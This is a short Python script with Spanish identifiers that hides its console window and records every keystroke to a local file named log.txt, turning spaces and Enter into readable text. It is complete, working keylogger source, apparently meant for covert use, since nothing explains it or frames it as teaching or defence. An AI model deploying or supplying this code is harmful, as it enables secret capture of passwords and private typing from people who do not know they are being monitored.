import ctypes
from pynput.keyboard import Key, Listener

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def al_presionar(tecla):
    tecla = str(tecla).replace("'", "")

    if tecla == 'Key.space':
        tecla = ' '
    elif tecla == 'Key.enter':
        tecla = '\n'

    with open('log.txt', 'a') as f:
        f.write(tecla)

with Listener(on_press=al_presionar) as listener:
    listener.join()


    